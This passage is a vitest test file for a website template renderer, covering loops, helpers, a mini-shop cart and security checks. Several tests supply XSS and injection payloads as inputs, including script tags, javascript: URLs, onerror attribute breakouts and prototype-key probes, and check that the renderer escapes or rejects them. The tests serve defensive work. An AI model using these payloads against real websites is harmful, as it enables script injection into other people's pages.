import { describe, it, expect } from 'vitest';
import { renderTemplate, validateTemplate, TemplateError, type TemplateContext } from '../src/template.js';

const ctx: TemplateContext = {
  company: { name: 'Acme & Co', address: { city: 'Berlin' } },
  website: { siteUrl: 'https://acme.test' },
  page: { title: 'Home', published: '2026-06-01T12:00:00Z' },
  dataset: {
    products: [
      { name: 'Widget', price: 9 },
      { name: 'Gadget', price: 12 },
    ],
    tags: ['a', 'b'],
    featured: true,
    empty: [],
  },
};

describe('dataset-aware {{#each}} — flattened fields + preview markers', () => {
  const items = [
    { id: 'e1', dataset: 'posts', values: { t: 'A' } },
    { id: 'e2', dataset: 'posts', values: { t: 'B' } },
  ];
  // Over a DATASET the iteration context IS entry.values, so fields are read directly ({{t}}, not {{values.t}}).
  const src = '<ul>{{#each dataset.posts}}<li>{{t}}</li>{{else}}<li>none</li>{{/each}}</ul>';

  it('flattens entry fields and exposes the envelope on @entry', () => {
    const out = renderTemplate('{{#each dataset.posts}}{{t}}:{{@entry.id}}:{{@entry.dataset}}{{#if @first}}*{{/if}};{{/each}}', {
      dataset: { posts: items },
    });
    expect(out).toBe('A:e1:posts*;B:e2:posts;');
  });

  it('wraps each row in a data-sw-entry marker ONLY when markEntries is set', () => {
    expect(renderTemplate(src, { dataset: { posts: items }, markEntries: true })).toBe(
      '<ul><div data-sw-entry="e1" data-sw-dataset="posts"><li>A</li></div><div data-sw-entry="e2" data-sw-dataset="posts"><li>B</li></div></ul>',
    );
  });

  it('emits NO wrapper without markEntries — publish is byte-identical to a plain loop', () => {
    expect(renderTemplate(src, { dataset: { posts: items } })).toBe('<ul><li>A</li><li>B</li></ul>');
  });

  it('renders the {{else}} inverse for an empty list', () => {
    expect(renderTemplate(src, { dataset: { posts: [] }, markEntries: true })).toBe('<ul><li>none</li></ul>');
  });

  it('a non-entry array (no id/dataset) falls through to the built-in #each (no flatten, no marker)', () => {
    const out = renderTemplate('{{#each nav.header}}<a href="{{sw-url this.href}}">{{this.label}}</a>{{/each}}', {
      nav: { header: [{ label: 'Home', href: '/' }] },
      markEntries: true,
    });
    expect(out).toBe('<a href="/">Home</a>');
  });

  // Nested-dataset values (a `list` field = an array of objects inside an entry) render with no
  // template change: the outer {{#each dataset.x}} flattens to entry.values, and the inner array is a
  // plain (non-entry) array that falls through to stock #each. This is the render half of the
  // nested-dataset feature (the schema half is in @sitewright/schema's dataset.ts).
  it('renders a nested list field (entry.values.slides[]) + a sibling scalar setting', () => {
    const hero = [
      {
        id: 'h1',
        dataset: 'hero',
        values: {
          show_navigation: true,
          slides: [
            { image: '/a.jpg', caption: 'A' },
            { image: '/b.jpg', caption: 'B' },
          ],
        },
      },
    ];
    const out = renderTemplate(
      '{{#each dataset.hero}}{{#if show_navigation}}[nav]{{/if}}{{#each slides}}<img src="{{sw-url image}}" alt="{{caption}}">{{/each}}{{/each}}',
      { dataset: { hero } },
    );
    expect(out).toBe('[nav]<img src="/a.jpg" alt="A"><img src="/b.jpg" alt="B">');
  });

  it('supports block params ({{#each dataset.posts as |post idx|}}) over flattened entry fields', () => {
    const out = renderTemplate('{{#each dataset.posts as |post idx|}}{{idx}}:{{post.t}};{{/each}}', { dataset: { posts: items } });
    expect(out).toBe('0:A;1:B;');
  });

  it('preserves ../ parent access from inside a dataset loop', () => {
    const out = renderTemplate('{{#each dataset.posts}}{{t}}@{{../page.title}};{{/each}}', {
      dataset: { posts: items },
      page: { title: 'Home' },
    });
    expect(out).toBe('A@Home;B@Home;');
  });
});

describe('page.slug + page.parent bindings', () => {
  it('renders page.slug and the page.parent view (path + data) through the context whitelist', () => {
    const ctx = {
      page: { title: 'Web', slug: 'web', path: '/services/web' },
      parentPage: { title: 'Services', slug: 'services', path: '/services', data: { eyebrow: 'What we do' } },
    };
    const out = renderTemplate(
      '<a href="{{sw-url page.parent.path}}">{{page.parent.title}}</a>/<b>{{page.slug}}</b> — {{page.parent.data.eyebrow}}',
      ctx,
    );
    expect(out).toBe('<a href="/services">Services</a>/<b>web</b> — What we do');
  });

  it('renders empty for page.parent.* when there is no parent (binding absent)', () => {
    const out = renderTemplate('[{{page.parent.path}}][{{page.parent.data.x}}]', { page: { slug: '', path: '/' } });
    expect(out).toBe('[][]');
  });
});

describe('{{item.<dataset>.<key>}} — direct keyed access', () => {
  const item = { services: { web: { title: 'Web Dev', price: 'from $10k' } } };
  it('resolves a keyed entry field without a loop', () => {
    expect(renderTemplate('<h1>{{item.services.web.title}}</h1>', { item })).toBe('<h1>Web Dev</h1>');
    expect(renderTemplate('<p>{{item.services.web.price}}</p>', { item })).toBe('<p>from $10k</p>');
  });
  it('renders empty for an unknown key (no error)', () => {
    expect(renderTemplate('[{{item.services.nope.title}}]', { item })).toBe('[]');
  });
});

describe('renderTemplate — Handlebars features', () => {
  it('passes literal HTML through and interpolates + HTML-escapes values', () => {
    expect(renderTemplate('<div class="grid">{{ page.title }}</div>', ctx)).toBe('<div class="grid">Home</div>');
    expect(renderTemplate('{{ company.name }}', ctx)).toBe('Acme &amp; Co');
    expect(renderTemplate('{{ company.address.city }}', ctx)).toBe('Berlin');
  });

  it('escapes an HTML-bearing value (XSS-safe in body/quoted attr)', () => {
    expect(renderTemplate('{{ page.t }}', { page: { t: '<script>alert(1)</script>' } })).toBe(
      '&lt;script&gt;alert(1)&lt;/script&gt;',
    );
  });

  it('supports {{#if}}/{{else}} and {{#unless}}', () => {
    expect(renderTemplate('{{#if dataset.featured}}Y{{else}}N{{/if}}', ctx)).toBe('Y');
    expect(renderTemplate('{{#if dataset.empty}}Y{{else}}N{{/if}}', ctx)).toBe('N');
    expect(renderTemplate('{{#unless page.missing}}ok{{/unless}}', ctx)).toBe('ok');
  });

  it('supports {{#each}} with @index/@first/@last and item fields', () => {
    expect(renderTemplate('{{#each dataset.products}}{{@index}}:{{name}}{{#unless @last}}, {{/unless}}{{/each}}', ctx)).toBe(
      '0:Widget, 1:Gadget',
    );
    expect(renderTemplate('{{#each dataset.tags}}[{{this}}]{{/each}}', ctx)).toBe('[a][b]');
  });

  it('supports {{#each}} @key over an object and block params', () => {
    const c: TemplateContext = { dataset: { obj: { a: 1, b: 2 } } };
    expect(renderTemplate('{{#each dataset.obj as |v k|}}{{k}}={{v}};{{/each}}', c)).toBe('a=1;b=2;');
  });

  it('supports {{#with}}, {{lookup}}, subexpressions, and @root', () => {
    expect(renderTemplate('{{#with company.address}}{{city}}{{/with}}', ctx)).toBe('Berlin');
    expect(renderTemplate('{{#each dataset.products}}{{ lookup ../dataset.tags @index }}{{/each}}', ctx)).toBe('ab');
    expect(renderTemplate('{{#each dataset.products}}{{ @root.company.name }} {{/each}}', ctx)).toBe('Acme &amp; Co Acme &amp; Co ');
  });

  it('renders partials in the current scope (incl. inside each)', () => {
    const c: TemplateContext = { ...ctx, partials: { card: '<li>{{name}} ({{price}})</li>' } };
    expect(renderTemplate('<ul>{{#each dataset.products}}{{> card}}{{/each}}</ul>', c)).toBe(
      '<ul><li>Widget (9)</li><li>Gadget (12)</li></ul>',
    );
  });

  it('VALIDATES partial sources too (an unsafe partial is rejected, not just the main template)', () => {
    const c: TemplateContext = { partials: { evil: '<script>steal()</script>' } };
    expect(() => renderTemplate('<div>{{> evil}}</div>', c)).toThrow(TemplateError);
  });

  it('turns a circular {{> partial}} chain into a clear error (not a worker crash)', () => {
    const c: TemplateContext = { partials: { a: '{{> b}}', b: '{{> a}}' } };
    expect(() => renderTemplate('{{> a}}', c)).toThrow(/circular|partial/i);
  });
});

describe('{{sw-html}} — sanitized HTML output', () => {
  it('renders stored HTML through the data-sw-html sanitizer (tags kept, scripts/handlers stripped)', () => {
    const ctx = { dataset: { faq: [{ id: 'f1', dataset: 'faq', status: 'published', values: { a: '<p>Hi <strong>there</strong></p><script>alert(1)</script><img src="x" onerror="alert(1)">' } }] } } as TemplateContext;
    const out = renderTemplate('{{#each dataset.faq}}<div>{{sw-html a}}</div>{{/each}}', ctx);
    expect(out).toContain('<p>Hi <strong>there</strong></p>');
    expect(out).not.toContain('<script');
    expect(out).not.toContain('onerror');
  });
  it('renders nothing for non-strings and empty strings', () => {
    expect(renderTemplate('<div>{{sw-html page.data.x}}</div>', { page: { data: { x: 42 } } })).toBe('<div></div>');
    expect(renderTemplate('<div>{{sw-html page.missing}}</div>', {})).toBe('<div></div>');
    expect(renderTemplate('<div>{{sw-html page.data.x}}</div>', { page: { data: { x: '' } } })).toBe('<div></div>');
  });
  it('strips data-sw-* directive attributes from richtext (no downstream form/html-sink injection)', () => {
    const html = '<p data-sw-form="contact" data-sw-html="key" data-sw-component="x">safe</p>';
    const out = renderTemplate('<div>{{sw-html page.data.v}}</div>', { page: { data: { v: html } } });
    expect(out).toBe('<div><p>safe</p></div>');
    expect(out).not.toContain('data-sw-');
  });
});

describe('renderTemplate — curated helpers (extensibility)', () => {
  it('{{sw-date}} formats a date (default + iso)', () => {
    expect(renderTemplate('{{sw-date page.published}}', ctx)).toBe('2026-06-01');
    expect(renderTemplate('{{sw-date page.published "iso"}}', ctx)).toBe('2026-06-01T12:00:00.000Z');
    expect(renderTemplate('{{sw-date page.nope}}', ctx)).toBe('');
  });

  it('{{sw-url}} sanitizes the scheme', () => {
    expect(renderTemplate('<a href="{{sw-url page.link}}">x</a>', { page: { link: 'javascript:alert(1)' } })).toBe(
      '<a href="#">x</a>',
    );
    expect(renderTemplate('<a href="{{sw-url page.link}}">x</a>', { page: { link: 'https://ok.test/a' } })).toBe(
      '<a href="https://ok.test/a">x</a>',
    );
  });

  it('{{sw-truncate}} clips long text', () => {
    expect(renderTemplate('{{sw-truncate page.t 5}}', { page: { t: 'abcdefgh' } })).toBe('abcd…');
    expect(renderTemplate('{{sw-truncate page.t 5}}', { page: { t: 'abc' } })).toBe('abc');
  });

  it('{{sw-translate}} reads the pre-resolved website.t map, escapes output, falls back to default=', () => {
    const ctxT = { website: { t: { nav_home: 'Start', amp: 'A & B' } } };
    expect(renderTemplate('{{sw-translate "nav_home"}}', ctxT)).toBe('Start');
    expect(renderTemplate('{{sw-translate "amp"}}', ctxT)).toBe('A &amp; B'); // escaped
    expect(renderTemplate('{{sw-translate "missing" default="Hi"}}', ctxT)).toBe('Hi');
    expect(renderTemplate('{{sw-translate "missing"}}', ctxT)).toBe('');
    expect(renderTemplate('{{sw-translate "nav_home"}}', {})).toBe(''); // no website.t → empty
    // usable in an attribute (escaped), and proto-key safe
    expect(renderTemplate('<a aria-label="{{sw-translate "nav_home"}}">x</a>', ctxT)).toContain('aria-label="Start"');
    expect(renderTemplate('{{sw-translate "__proto__" default="ok"}}', ctxT)).toBe('ok');
  });

  it('{{sw-icon}} inlines a built-in SVG (trusted body, escaped class), empty for unknown', () => {
    const out = renderTemplate('{{sw-icon "arrow-right" "h-5 w-5"}}', ctx);
    expect(out).toContain('<svg class="h-5 w-5"');
    expect(out).toContain('stroke="currentColor"');
    expect(out).toContain('aria-hidden="true"');
    expect(out).toContain('<path d="M5 12h14"'); // arrow-right body, emitted raw (SafeString)
    // Unknown icon → nothing (never reflects the name).
    expect(renderTemplate('[{{sw-icon "does-not-exist"}}]', ctx)).toBe('[]');
    // The class is attribute-escaped (no breakout possible).
    expect(renderTemplate('{{sw-icon "check" "a\\"onerror=x"}}', ctx)).not.toContain('"onerror=x');
  });

  it('{{sw-icon}} renders a brand: logo as a filled path (themeable), empty for an unknown brand', () => {
    const out = renderTemplate('{{sw-icon "brand:whatsapp" "h-4 w-4"}}', ctx);
    expect(out).toContain('<svg class="h-4 w-4"');
    expect(out).toContain('fill="currentColor"'); // brand logos fill (theme via text color), not stroke
    expect(out).toContain('<path d="'); // the brand path, emitted raw (SafeString)
    expect(out).not.toContain('stroke="currentColor"');
    // Unknown brand slug → nothing.
    expect(renderTemplate('[{{sw-icon "brand:nope"}}]', ctx)).toBe('[]');
  });

  it('{{sw-flag}} inlines a full-color country flag (rect + circle), labeled, empty for unknown', () => {
    const rect = renderTemplate('{{sw-flag "de" "h-4 rounded-sm"}}', ctx);
    expect(rect).toContain('<svg class="h-4 rounded-sm" viewBox="0 0 640 480"');
    expect(rect).toContain('role="img" aria-label="Germany"');
    expect(rect).toContain('<title>Germany</title>');
    expect(rect).toContain('fill='); // keeps its own colors — NOT currentColor
    expect(rect).not.toContain('currentColor');

    const circle = renderTemplate('{{sw-flag "de-circle"}}', ctx);
    expect(circle).toContain('viewBox="0 0 512 512"');
    expect(circle).toContain('mask id="cde-a"'); // namespaced per country+shape

    // Two flags on one page keep distinct ids (no clip/mask collision).
    const two = renderTemplate('{{sw-flag "de-circle"}}{{sw-flag "fr-circle"}}', ctx);
    expect([...two.matchAll(/mask id="(c..-a)"/g)].map((m) => m[1])).toEqual(['cde-a', 'cfr-a']);

    // Unknown code → nothing; a class with a quote can't break out (escaped).
    expect(renderTemplate('[{{sw-flag "zz"}}]', ctx)).toBe('[]');
    expect(renderTemplate('{{sw-flag "de" "a\\"onerror=x"}}', ctx)).not.toContain('"onerror=x');
  });
});

describe('renderTemplate — {{sw-active}} nav active state', () => {
  // Render `{{#if (<expr>)}}A{{/if}}` against a page at `current`.
  const at = (current: string, expr: string) => renderTemplate(`{{#if (${expr})}}A{{/if}}`, { page: { path: current } });

  it('is active on the exact current page', () => {
    expect(at('/about', "sw-active '/about'")).toBe('A');
  });

  it('lights the active trail (an ancestor route) by default', () => {
    expect(at('/services/web', "sw-active '/services'")).toBe('A');
  });

  it('never marks a nav PLACEHOLDER active, even when its path matches the current page', () => {
    const src = '{{#each nav.header}}{{#if (sw-active path)}}A{{/if}}{{/each}}';
    // A placeholder whose target IS the current page → still NOT active.
    expect(renderTemplate(src, { page: { path: '/about' }, nav: { header: [{ label: 'About', path: '/about', placeholder: true }] } })).toBe('');
    // Control: a REAL page nav item at the same path IS active.
    expect(renderTemplate(src, { page: { path: '/about' }, nav: { header: [{ label: 'About', path: '/about' }] } })).toBe('A');
    // A placeholder is also never lit by the active TRAIL (its target an ancestor of the current page).
    expect(renderTemplate(src, { page: { path: '/services/web' }, nav: { header: [{ label: 'Services', path: '/services', placeholder: true }] } })).toBe('');
  });

  it('exact=true matches the current page ONLY (no trail)', () => {
    expect(at('/services/web', "sw-active '/services' exact=true")).toBe('');
    expect(at('/services', "sw-active '/services' exact=true")).toBe('A');
  });

  it('does not match unrelated routes or partial segments', () => {
    expect(at('/about', "sw-active '/services'")).toBe('');
    expect(at('/services', "sw-active '/serv'")).toBe(''); // /serv is not an ancestor of /services
  });

  it('root "/" matches only itself, never every page', () => {
    expect(at('/', "sw-active '/'")).toBe('A');
    expect(at('/about', "sw-active '/'")).toBe('');
  });

  it('a locale home ("/es") matches only itself on that locale\'s pages — never the whole locale tree', () => {
    // Render against a localized page. `page.locale` is the RESOLVED locale and `page.defaultLocale`
    // the project default — both in every preview + publish projection.
    const atLocale = (current: string, locale: string, expr: string) =>
      renderTemplate(`{{#if (${expr})}}A{{/if}}`, { page: { path: current, locale, defaultLocale: 'en' } });
    // The localized Home link must NOT light up on every /es/... subpage (it is everyone's ancestor).
    expect(atLocale('/es/tienda', 'es', "sw-active '/es'")).toBe('');
    expect(atLocale('/es/tienda', 'es', "sw-active '/es/'")).toBe(''); // trailing-slash spelling too
    expect(atLocale('/es', 'es', "sw-active '/es'")).toBe('A');
    expect(atLocale('/es/', 'es', "sw-active '/es'")).toBe('A');
    // Deeper trails inside the locale tree still work.
    expect(atLocale('/es/servicios/seo', 'es', "sw-active '/es/servicios'")).toBe('A');
    // A page whose route merely LOOKS like a locale prefix is untouched when the page's locale differs
    // (default-locale pages are unprefixed, so /es here is an ordinary page with an /es/child).
    expect(atLocale('/es/child', 'en', "sw-active '/es'")).toBe('A');
    // The DEFAULT locale never claims a locale home: a monolingual EN site with an ordinary content
    // page at /en keeps its trail (page.locale resolves to the default on every unprefixed page).
    expect(atLocale('/en/child', 'en', "sw-active '/en'")).toBe('A');
    // Without locale context (ad-hoc render-template bodies, snippet hovers) only "/" is special.
    expect(renderTemplate("{{#if (sw-active '/es')}}A{{/if}}", { page: { path: '/es/tienda' } })).toBe('A');
  });

  it('ignores trailing slashes', () => {
    expect(at('/about/', "sw-active '/about'")).toBe('A');
    expect(at('/about', "sw-active '/about/'")).toBe('A');
  });

  it('is false with no current page or a non-string/empty target', () => {
    expect(renderTemplate("{{#if (sw-active '/x')}}A{{/if}}", {})).toBe('');
    expect(renderTemplate('{{#if (sw-active page.nope)}}A{{/if}}', { page: { path: '/x' } })).toBe('');
  });

  it('drives class (trail) + aria-current="page" (exact, omitted elsewhere) inside {{#each nav.header}}', () => {
    const tpl =
      '{{#each nav.header}}<a class="{{#if (sw-active path)}}on{{/if}}"' +
      '{{#if (sw-active path exact=true)}} aria-current="page"{{/if}}>{{label}}</a>{{/each}}';
    const out = renderTemplate(tpl, {
      page: { path: '/services/web' },
      nav: {
        header: [
          { label: 'Home', path: '/' },
          { label: 'Services', path: '/services' }, // trail-active (ancestor) → class, no aria
          { label: 'Web', path: '/services/web' }, // the exact page → class + aria-current="page"
          { label: 'About', path: '/about' },
        ],
      },
    });
    expect(out).toBe(
      '<a class="">Home</a>' +
        '<a class="on">Services</a>' +
        '<a class="on" aria-current="page">Web</a>' +
        '<a class="">About</a>',
    );
  });
});

describe('renderTemplate — MINI SHOP helpers', () => {
  // The cart helpers are GATED on the master switch `website.shop.enabled === true`. Build a render ctx
  // with the shop enabled; `extra.website` (e.g. a `t` catalog) merges with the enabled shop. ALL cart
  // display text (drawer strings, currency symbol/code, channel/field labels) resolves from the catalog
  // (website.t); settings (shop) holds only structure (enabled, currency position/decimals, channel config).
  const shopCtx = (shop: Record<string, unknown> = {}, extra: Record<string, unknown> = {}): TemplateContext => {
    const { website: wx = {}, ...rest } = extra as { website?: Record<string, unknown> } & Record<string, unknown>;
    return { ...rest, website: { ...wx, shop: { enabled: true, ...shop } } } as TemplateContext;
  };

  it('{{sw-cart}} and {{sw-add-to-cart}} render NOTHING unless the shop is enabled', () => {
    expect(renderTemplate('{{sw-cart}}', {})).toBe('');
    expect(renderTemplate('{{sw-cart}}', { website: { shop: {} } })).toBe(''); // config present but not enabled
    expect(renderTemplate('{{sw-add-to-cart sku="x" name="A" price="1"}}', {})).toBe('');
    expect(renderTemplate('{{sw-add-to-cart sku="x" name="A" price="1"}}', { website: { shop: {} } })).toBe('');
    expect(renderTemplate('{{sw-cart}}', shopCtx())).toContain('data-sw-cart');
    expect(renderTemplate('{{sw-add-to-cart sku="x" name="A" price="1"}}', shopCtx())).toContain('data-sw-cart-add');
  });

  it('{{sw-add-to-cart}} emits an escaped add-to-cart button with a canonical numeric price', () => {
    const out = renderTemplate('{{sw-add-to-cart sku="w1" name="Widget" price="19.90"}}', shopCtx());
    expect(out).toBe('<button type="button" data-sw-cart-add data-sku="w1" data-name="Widget" data-price="19.9">Add to cart</button>');
  });

  it('{{sw-add-to-cart}} coerces a bad/negative price to 0 and falls back sku→name', () => {
    expect(renderTemplate('{{sw-add-to-cart name="Free thing" price="nope"}}', shopCtx())).toContain('data-price="0"');
    expect(renderTemplate('{{sw-add-to-cart name="X" price="-5"}}', shopCtx())).toContain('data-price="0"');
    expect(renderTemplate('{{sw-add-to-cart name="X" price="1"}}', shopCtx())).toContain('data-sku="X"');
    expect(renderTemplate('[{{sw-add-to-cart price="1"}}]', shopCtx())).toBe('[]');
  });

  it('{{sw-add-to-cart}} keeps a quote/ampersand name from breaking out of the attribute', () => {
    const out = renderTemplate('{{sw-add-to-cart sku="x" name=dataset.evil}}', shopCtx({}, {
      dataset: { evil: 'A&B" onerror=alert(1) z="' },
    }));
    expect(out).not.toContain('" onerror=');
    expect(out).toContain('&quot;');
    expect(out).toContain('A&amp;B');
  });

  it('{{sw-add-to-cart}} drops an unsafe image url, keeps a safe one', () => {
    expect(renderTemplate('{{sw-add-to-cart sku="x" name="A" image="javascript:alert(1)"}}', shopCtx())).not.toContain('data-image');
    expect(renderTemplate('{{sw-add-to-cart sku="x" name="A" image="/img/a.png"}}', shopCtx())).toContain('data-image="/img/a.png"');
  });

  it('{{sw-add-to-cart}} label precedence: hash > catalog cart_add > built-in default', () => {
    const ctx = shopCtx({}, { website: { t: { cart_add: 'In den Warenkorb' } } });
    expect(renderTemplate('{{sw-add-to-cart sku="x" name="A" price="1"}}', ctx)).toContain('>In den Warenkorb</button>'); // catalog
    expect(renderTemplate('{{sw-add-to-cart sku="x" name="A" price="1" label="Buy"}}', ctx)).toContain('>Buy</button>'); // hash beats catalog
    expect(renderTemplate('{{sw-add-to-cart sku="x" name="A" price="1"}}', shopCtx())).toContain('>Add to cart</button>'); // built-in default
  });

  it('{{sw-cart}} emits the mount with currency (from the catalog) + channels JSON (labels from shop.<key>)', () => {
    const ctxShop = shopCtx(
      {
        currency: { position: 'after', decimals: 2 },
        channels: [
          { kind: 'whatsapp', key: 'whatsapp', number: '+14155550123' },
          { kind: 'payment', key: 'pay', urlTemplate: 'https://paypal.me/acme/{total}' },
        ],
      },
      { website: { t: { cart_currency_symbol: '€', cart_currency_code: 'EUR', 'shop.whatsapp': 'WhatsApp' } } },
    );
    const out = renderTemplate('{{sw-cart}}', ctxShop);
    expect(out.startsWith('<div data-sw-cart')).toBe(true);
    expect(out).toContain('data-currency-symbol="€"'); // from cart_currency_symbol
    expect(out).toContain('data-currency-code="EUR"'); // from cart_currency_code
    expect(out).toContain('data-currency-pos="after"'); // from settings
    expect(out).toContain('data-channels="');
    expect(out).toContain('&quot;kind&quot;:&quot;whatsapp&quot;');
    expect(out).toContain('&quot;label&quot;:&quot;WhatsApp&quot;'); // channel label resolved from shop.whatsapp
    expect(out).toContain('&quot;urlTemplate&quot;:&quot;https://paypal.me/acme/{total}&quot;');
  });

  it('{{sw-cart}} emits the built-in English defaults for every drawer string + currency (enabled, empty catalog)', () => {
    const out = renderTemplate('{{sw-cart}}', shopCtx());
    expect(out).toContain('data-currency-symbol="$"'); // cart_currency_symbol default
    expect(out).toContain('data-currency-code="USD"'); // cart_currency_code default
    expect(out).toContain('data-cart-title="Your cart"');
    expect(out).toContain('data-added-label="Added"');
    expect(out).toContain('data-empty-label="Your cart is empty."');
    expect(out).toContain('data-total-label="Total"'); // cart_total default
    expect(out).toContain('data-clear-label="Clear cart"');
    expect(out).toContain('data-sent-label="Order sent — we will be in touch."');
    expect(out).toContain('data-order-lead="I’d like to order:"');
  });

  it('{{sw-cart}} hash overrides win over the catalog and emit the per-string data-*-label attrs', () => {
    const ctxShop = shopCtx({}, { website: { t: { cart_title: 'Catalog title' } } });
    const out = renderTemplate(
      '{{sw-cart title="Warenkorb" note="Preise unverbindlich." added="Hinzugefügt" empty="Ihr Warenkorb ist leer." total="Zwischensumme" clear="Leeren" sent="Bestellung gesendet."}}',
      ctxShop,
    );
    expect(out).toContain('data-cart-title="Warenkorb"');
    expect(out).toContain('data-note="Preise unverbindlich."');
    expect(out).toContain('data-added-label="Hinzugefügt"');
    expect(out).toContain('data-empty-label="Ihr Warenkorb ist leer."');
    expect(out).toContain('data-total-label="Zwischensumme"');
    expect(out).toContain('data-clear-label="Leeren"');
    expect(out).toContain('data-sent-label="Bestellung gesendet."');
    expect(out).not.toContain('Catalog title'); // the hash override beats the catalog
  });

  it('{{sw-cart}} auto-localizes drawer strings + currency + channel/field labels from the catalog (no per-page wiring)', () => {
    const out = renderTemplate('{{sw-cart}}', shopCtx(
      { channels: [{ kind: 'whatsapp', key: 'whatsapp', number: '+14155550123', fields: [{ key: 'name', type: 'text', required: true }] }] },
      {
        website: {
          t: {
            cart_title: 'Warenkorb',
            cart_note: 'Preise unverbindlich.',
            cart_added: 'Hinzugefügt',
            cart_empty: 'Leer.',
            cart_total: 'Zwischensumme',
            cart_clear: 'Leeren',
            cart_sent: 'Gesendet.',
            cart_order_lead: 'Ich möchte bestellen:',
            cart_currency_symbol: '€',
            cart_currency_code: 'EUR',
            'shop.whatsapp': 'Per WhatsApp bestellen',
            'shop.name': 'Ihr Name',
          },
        },
      },
    ));
    expect(out).toContain('data-cart-title="Warenkorb"');
    expect(out).toContain('data-note="Preise unverbindlich."');
    expect(out).toContain('data-added-label="Hinzugefügt"');
    expect(out).toContain('data-empty-label="Leer."');
    expect(out).toContain('data-total-label="Zwischensumme"');
    expect(out).toContain('data-clear-label="Leeren"');
    expect(out).toContain('data-sent-label="Gesendet."');
    expect(out).toContain('data-order-lead="Ich möchte bestellen:"');
    expect(out).toContain('data-currency-symbol="€"');
    expect(out).toContain('&quot;label&quot;:&quot;Per WhatsApp bestellen&quot;'); // channel label localized
    expect(out).toContain('&quot;label&quot;:&quot;Ihr Name&quot;'); // field label localized
  });

  it('{{sw-cart}} drawer-string precedence: hash > catalog > built-in default', () => {
    const ctx = shopCtx({}, { website: { t: { cart_title: 'Catalog title' } } });
    expect(renderTemplate('{{sw-cart title="Hash title"}}', ctx)).toContain('data-cart-title="Hash title"'); // hash wins
    expect(renderTemplate('{{sw-cart}}', ctx)).toContain('data-cart-title="Catalog title"'); // catalog wins over default
    expect(renderTemplate('{{sw-cart}}', shopCtx())).toContain('data-cart-title="Your cart"'); // built-in default
  });

  it('{{sw-cart}} projects per-channel order fields (label from shop.<key>, type, required) for whatsapp + mailto', () => {
    const ctxShop = shopCtx(
      {
        channels: [
          { kind: 'whatsapp', key: 'whatsapp', number: '+14155550123', fields: [{ key: 'name', type: 'text', required: true }] },
          { kind: 'mailto', key: 'email', email: 'a@b.test', fields: [{ key: 'address', type: 'textarea' }] },
        ],
      },
      { website: { t: { 'shop.name': 'Your name', 'shop.address': 'Your address' } } },
    );
    const out = renderTemplate('{{sw-cart}}', ctxShop);
    expect(out).toContain('&quot;fields&quot;');
    expect(out).toContain('&quot;label&quot;:&quot;Your name&quot;'); // resolved from shop.name
    expect(out).toContain('&quot;required&quot;:true');
    expect(out).toContain('&quot;label&quot;:&quot;Your address&quot;'); // resolved from shop.address
    expect(out).toContain('&quot;type&quot;:&quot;textarea&quot;');
    // a channel WITHOUT fields has no fields key in its JSON
    const noFields = renderTemplate('{{sw-cart}}', shopCtx({ channels: [{ kind: 'whatsapp', key: 'whatsapp', number: '+14155550123' }] }));
    expect(noFields).not.toContain('&quot;fields&quot;');
  });

  it('{{sw-cart}} falls back to the channel/field KEY when its shop.<key> label is untranslated', () => {
    const out = renderTemplate('{{sw-cart}}', shopCtx({ channels: [{ kind: 'whatsapp', key: 'whatsapp', number: '+14155550123' }] }));
    expect(out).toContain('&quot;label&quot;:&quot;whatsapp&quot;'); // no catalog entry → the bare key
  });

  it('{{sw-cart}} emits data-brand from company.name (for the email greeting) only when present', () => {
    const out = renderTemplate('{{sw-cart}}', shopCtx({ channels: [{ kind: 'mailto', key: 'email', email: 'a@b.test' }] }, { company: { name: 'Acme & Co' } }));
    expect(out).toContain('data-brand="Acme &amp; Co"');
    expect(renderTemplate('{{sw-cart}}', shopCtx({ channels: [{ kind: 'mailto', key: 'email', email: 'a@b.test' }] }))).not.toContain('data-brand');
  });

  it('{{sw-cart}} projects a form channel only when its endpoint is resolved', () => {
    const withEp = shopCtx({ channels: [{ kind: 'form', key: 'order_form', formId: 'order', endpoint: '/f/p1/order' }] });
    const out = renderTemplate('{{sw-cart}}', withEp);
    expect(out).toContain('data-channels=');
    expect(out).toContain('/f/p1/order');
    expect(out).toContain('&quot;kind&quot;:&quot;form&quot;');
    expect(renderTemplate('{{sw-cart}}', shopCtx({ channels: [{ kind: 'form', key: 'order_form', formId: 'order' }] }))).not.toContain('data-channels');
  });

  it('{{sw-cart}} unicode-escapes < > & in the channels JSON (the resolved label survives the directive round-trip)', () => {
    const ctxShop = shopCtx({ channels: [{ kind: 'mailto', key: 'email', email: 'a@b.test' }] }, { website: { t: { 'shop.email': 'B&H <Photo>' } } });
    const out = renderTemplate('{{sw-cart}}', ctxShop);
    expect(out).toContain('B\\u0026H \\u003cPhoto\\u003e');
    expect(out).not.toContain('B&H <Photo>');
  });
});

describe('renderTemplate — security', () => {
  it('disables prototype access', () => {
    expect(renderTemplate('[{{ company.constructor }}]', ctx)).toBe('[]');
    expect(renderTemplate('[{{ company.__proto__ }}]', ctx)).toBe('[]');
  });

  it('does not re-evaluate a value that looks like a tag (no injection from data)', () => {
    const c: TemplateContext = { page: { title: '{{ company.secret }}' }, company: { secret: 'LEAK' } };
    expect(renderTemplate('{{ page.title }}', c)).toBe('{{ company.secret }}');
  });

  it('caps output size', () => {
    const c: TemplateContext = { dataset: { items: Array.from({ length: 5000 }, () => 'xxxxxxxxxx') } };
    expect(() => renderTemplate('{{#each dataset.items}}{{this}}{{/each}}', c, { maxOutput: 1000 })).toThrow(TemplateError);
  });
});

describe('validateTemplate — context-aware rejection (Handlebars is not context-aware)', () => {
  const rejects = (tpl: string) => expect(() => validateTemplate(tpl)).toThrow(TemplateError);
  const allows = (tpl: string) => expect(() => validateTemplate(tpl)).not.toThrow();

  it('bans raw {{{ }}} output', () => {
    rejects('<p>{{{ page.html }}}</p>');
  });

  it('reports the 1-based line/column of the offending construct (message + fields)', () => {
    // The bad <nav> is on line 3, indented by 2 spaces (column 3).
    const src = '<div>\n  <p>ok</p>\n  <nav>bad</nav>\n</div>';
    try {
      validateTemplate(src);
      throw new Error('expected validateTemplate to throw');
    } catch (err) {
      expect(err).toBeInstanceOf(TemplateError);
      const e = err as TemplateError;
      expect(e.line).toBe(3);
      expect(e.column).toBe(3);
      expect(e.message).toContain('(line 3, column 3)');
    }
  });

  it('points at the EVENT-HANDLER attribute name itself (not the = / > that closed it)', () => {
    let e: TemplateError | null = null;
    try {
      validateTemplate('<section>\n  <div onclick="x">y</div>\n</section>');
    } catch (err) {
      e = err as TemplateError;
    }
    expect(e?.line).toBe(2);
    expect(e?.column).toBe(8); // the 'o' of onclick
    expect(e?.message).toMatch(/event-handler/);
  });

